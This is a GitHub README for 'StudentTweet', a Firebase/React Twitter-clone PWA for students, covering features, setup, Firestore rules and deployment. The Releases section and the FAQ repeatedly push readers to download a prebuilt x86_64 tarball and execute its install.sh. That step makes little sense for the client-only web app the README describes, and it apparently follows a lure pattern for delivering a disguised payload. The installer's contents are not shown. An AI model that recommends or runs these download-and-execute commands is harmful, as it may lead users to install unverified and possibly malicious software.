[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/Gb051421/studenttweet-/releases)

# StudentTweet — Lightweight Twitter Clone for Students (PWA)

![StudentTweet screenshot](https://images.unsplash.com/photo-1522202176988-66273c2fd55f?auto=format&fit=crop&w=1400&q=80)

Tags: firebase, firebase-authentication, firebase-storage, firestore, progressive-web-app, pwa, react, realtime-database, social-media, student-project, tailwindcss, twitter-clone, vite, webapp

Table of contents
- Features
- Demo
- Tech stack
- Architecture
- Prerequisites
- Local setup
- Environment variables
- Firebase setup
- Releases (download and run)
- PWA and offline behavior
- Testing
- Deployment
- Contributing
- License
- FAQ
- Acknowledgements

Features
- Post short text messages with optional image attachments.
- Real-time updates: new posts and likes appear instantly via Firestore listeners.
- Authentication: email/password and OAuth (Google) via Firebase Auth.
- Likes, replies, simple mentions, and basic search.
- Progressive Web App: installable on desktop and mobile, offline-first caching.
- Media storage: images stored in Firebase Storage.
- Tailwind CSS for utility-first styling.
- Vite + React for fast dev and optimized build.

Demo
- Live demo: run locally or deploy to Firebase Hosting or Vercel.
- Screenshots: find UI snapshots in the repo's /docs/screenshots folder.

Tech stack
- React (Vite) — UI and routing.
- Firebase — Auth, Firestore, Storage, Hosting, Realtime updates.
- Tailwind CSS — styling.
- PWA standard — service worker and manifest.
- TypeScript optional (project supports JS or TS variant).
- GitHub Actions (optional) for CI/CD.

Architecture
- Client-only app. The client handles most logic and talks directly to Firebase.
- Firestore collections:
  - posts — post documents with text, authorId, timestamp, likesCount, media.
  - users — profile info, displayName, avatarUrl.
  - likes — optional subcollection or map to track per-user likes.
- Storage for binary assets (images).
- Firebase Auth for identity.
- Service worker caches static assets and recent reads for offline view.

Prerequisites
- Node.js (v16+) or newer.
- npm or yarn.
- Firebase account and project.
- Firebase CLI for hosting or functions work.
- git for cloning the repo.

Local setup
1. Clone
   git clone https://github.com/Gb051421/studenttweet-.git
   cd studenttweet-

2. Install
   npm install
   or
   yarn

3. Copy env template
   cp .env.example .env

4. Fill Firebase config in .env
   See Environment variables below.

5. Run dev server
   npm run dev
   or
   yarn dev

6. Build for production
   npm run build
   or
   yarn build

Environment variables
- The project uses Vite env variables prefixed with VITE_.
- Example .env entries:
  VITE_FIREBASE_API_KEY=your_api_key
  VITE_FIREBASE_AUTH_DOMAIN=your-project.firebaseapp.com
  VITE_FIREBASE_PROJECT_ID=your-project-id
  VITE_FIREBASE_STORAGE_BUCKET=your-project.appspot.com
  VITE_FIREBASE_MESSAGING_SENDER_ID=your_sender_id
  VITE_FIREBASE_APP_ID=your_app_id
  VITE_FIREBASE_MEASUREMENT_ID=G-XXXXXXXXXX

- Keep these values private. Do not commit .env to the repo.

Firebase setup
1. Create a Firebase project at the Firebase console.
2. Enable Authentication
   - Email/Password
   - Google (optional)
   Configure OAuth client IDs if prompted.

3. Firestore
   - Create in production or test mode.
   - Use rules to allow read/write only to authenticated users where appropriate.
   Example rule snippet:
   service cloud.firestore {
     match /databases/{database}/documents {
       match /posts/{postId} {
         allow read: if true;
         allow write: if request.auth != null && request.auth.uid == request.resource.data.authorId;
       }
     }
   }

4. Storage
   - Create a storage bucket.
   - Add rules to restrict uploads to authenticated users.

5. Hosting (optional)
   - Install Firebase CLI: npm i -g firebase-tools
   - firebase login
   - firebase init hosting
   - firebase deploy --only hosting

Releases (download and run)
- A packaged release is available on the Releases page. Download the release asset and execute the included installer script.
- Example commands (replace the filename and tag with the actual release asset):
  curl -L -o studenttweet-v1.0.0-x86_64.tar.gz https://github.com/Gb051421/studenttweet-/releases/download/v1.0.0/studenttweet-v1.0.0-x86_64.tar.gz
  tar -xzvf studenttweet-v1.0.0-x86_64.tar.gz
  cd studenttweet-v1.0.0
  ./install.sh

- The releases page:
  [Download releases](https://github.com/Gb051421/studenttweet-/releases)

- The installer script will extract a prebuilt bundle and provide a small static server for local testing, or deploy instructions for Firebase Hosting. Adjust permissions if needed:
  chmod +x install.sh

PWA and offline behavior
- The app registers a service worker that caches the app shell.
- Static assets come from the build output.
- Firestore data uses offline persistence on supported browsers. The app displays the last synced posts when offline.
- Install the app from the browser install prompt or use the browser menu to add to home screen.

Testing
- Unit tests: run npm test (if tests exist).
- E2E: the repo includes a Cypress scaffold in /e2e (optional).
  npm run cypress:open

- Linting:
  npm run lint
  npm run format

Deployment
- Firebase Hosting
  - Ensure project and hosting are configured.
  - Build the app: npm run build
  - firebase deploy --only hosting

- Vercel
  - Vercel detects Vite apps. Set environment variables in the Vercel dashboard.
  - Use the build command: npm run build
  - Serve from the /dist folder.

- Static CDN
  - The build output lives in /dist. You can upload it to any static CDN or S3 bucket.

Contributing
- Fork the repo.
- Create a feature branch: git checkout -b feat/your-feature
- Commit changes with clear messages.
- Open a Pull Request to main.
- Include a short description and testing notes.
- Use issues for bug reports or feature requests. Tag issues with relevant topic tags.

Developer notes
- The codebase uses a modular structure:
  - src/components — UI components
  - src/hooks — custom hooks (useAuth, usePosts)
  - src/lib/firebase — Firebase init and helpers
  - src/pages — route pages
  - src/styles — Tailwind config and global styles
- Real-time listeners use onSnapshot from Firestore. Clean up listeners in useEffect return.
- Security: use server-side security rules in Firestore and Storage, and validate inputs on the client.

Tips and best practices
- Rate-limit writes from the client by batching writes or using Cloud Functions for heavy logic.
- Use Firestore indexes for fast queries over posts and timestamps.
- Store media as compressed images to reduce bandwidth.
- Keep user profile and public display fields small to reduce read costs.

FAQ
Q: Where do I find the releases?
A: Visit the releases page at https://github.com/Gb051421/studenttweet-/releases and download the file. The release asset includes an installer script that you need to execute.

Q: Does this app support push notifications?
A: The repo includes hooks for Firebase Cloud Messaging. You must configure FCM credentials and enable web push in your Firebase console.

Q: Can I run the project without Firebase?
A: The app depends on Firebase for auth and data. You can swap data access with a mock backend for local testing. See /mocks for a simple mock implementation.

Q: How do I reset Firestore rules for development?
A: Use the Firebase console or CLI. For quick local testing, create a dev collection and set permissive rules only in an isolated dev project.

License
- MIT License. See LICENSE file.

Acknowledgements
- Tailwind CSS
- Firebase
- Vite and React
- Unsplash for demo images

Screenshots
- Desktop timeline: assets/screenshots/timeline-desktop.png
- Mobile compose: assets/screenshots/compose-mobile.png

Social and links
- Releases: [![Get Releases](https://img.shields.io/badge/Get%20Releases-Click%20Here-green?logo=github)](https://github.com/Gb051421/studenttweet-/releases)
- Repo: https://github.com/Gb051421/studenttweet-

Contact
- Open an issue for questions, feature requests, or bug reports.